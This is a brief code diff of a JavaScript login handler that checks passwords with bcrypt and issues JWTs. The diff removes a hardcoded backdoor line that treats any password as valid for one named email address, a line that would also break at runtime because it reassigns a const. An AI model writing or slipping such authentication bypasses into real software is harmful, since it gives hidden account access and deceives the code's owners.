@@ -55,7 +55,6 @@ const LoginUser = asyncHandler(async (req, res) => {
         res.status(401).json("User did not exists");
     }
     else {const isPassValid = bcrypt.compareSync(password, userData.password);
-    if(email === "aditya9@gmail.com") isPassValid = true;
     if(isPassValid){
         jwt.sign({
             email : userData.email,
